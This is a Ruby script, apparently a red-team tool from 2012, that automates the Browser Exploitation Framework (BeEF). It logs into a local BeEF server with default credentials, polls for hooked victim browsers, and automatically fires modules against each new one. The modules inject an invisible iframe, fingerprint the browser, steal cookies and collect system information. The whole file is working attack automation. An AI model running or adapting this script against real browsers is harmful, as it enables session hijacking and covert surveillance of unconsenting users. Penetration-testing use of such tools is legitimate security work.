#!/usr/bin/ruby

# autorun.rb - Script to autolaunch BeEF modules
# Created by Ryan Linn and Steve Ocepek
# Copyright (C) 2012 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>. 

require 'rest_client'
require 'json'
require 'pp'

$stdout.sync = true
# RESTful API root endpoints
ATTACK_DOMAIN = "127.0.0.1"
RESTAPI_HOOKS = "http://" + ATTACK_DOMAIN + ":3000/api/hooks"
RESTAPI_LOGS = "http://" + ATTACK_DOMAIN + ":3000/api/logs"
RESTAPI_MODULES = "http://" + ATTACK_DOMAIN + ":3000/api/modules"
RESTAPI_ADMIN = "http://" + ATTACK_DOMAIN + ":3000/api/admin"

BEEF_USER = "beef"
BEEF_PASSWD = "beef"

@autorun_mods = [
	{ 'Invisible_iframe' => {'target' => 'http://192.168.50.52/' }},
  { 'Browser_fingerprinting' => {}},
  { 'Get_cookie' => {}},
  { 'Get_system_info' => {}}
  
	]
@ses_cache = {}

def login
	response = RestClient.post "#{RESTAPI_ADMIN}/login",
                             { 'username' => "#{BEEF_USER}",
                               'password' => "#{BEEF_PASSWD}"}.to_json,
                             :content_type => :json,
                             :accept => :json
  	@token = JSON.parse(response.body)['token']
end

def get_alive
  response = RestClient.get "#{RESTAPI_HOOKS}", {:params => {:token => @token}}
  result = JSON.parse(response.body)
  @hooks = result["hooked-browsers"]["online"]
  @alive_ips = []
  @hooks.each do |hook|
	@alive_ips << hook[1]['ip']
	@ses_cache[hook[1]['ip']] = hook[1]['session']
  end
end

def get_mod_cache
	response = RestClient.get "#{RESTAPI_MODULES}", {:params => {:token => @token}}
  	modules = JSON.parse(response.body)
	@mod_cache = {}
	modules.each do |mod|
		if mod[1]['class'] == 'Msf_module'
			@mod_cache[mod[1]['name']] = { :id => mod[1]['id'], :name => mod[1]['name']}
		else
			@mod_cache[mod[1]['class']] = { :id => mod[1]['id'], :name => mod[1]['name']}
		end
	end
end
def get_mod_info(mod)
	response = RestClient.get "#{RESTAPI_MODULES}" + "/#{mod}", {:params => {:token => @token}}
  	modinfo= JSON.parse(response.body)
end
def send_mod(mod, ses,opts)
	response = RestClient.post "#{RESTAPI_MODULES}" + "/#{ses}/#{mod}?token=#{@token}", opts.to_json,:content_type => :json, :accept => :json
  	res = JSON.parse(response.body)
    return  {:ses => ses , :mod => mod, :cmd => res['command_id'] }
end

login
get_mod_cache
processed_ips = []
while true do 
	get_alive
	@alive_ips.each do |ip|
		next if processed_ips.include? ip
		print "[*] Running autorun mods against #{ip}\n"
		@autorun_mods.each do |modinfo|
			modinfo.each do |mod,opts|
				mid = @mod_cache[mod][:id]
				ses = @ses_cache[ip]
				res = send_mod(mid,ses,opts)
        print res.to_json + "\n"
			end
		end
		processed_ips << ip
	end
	sleep 5

end
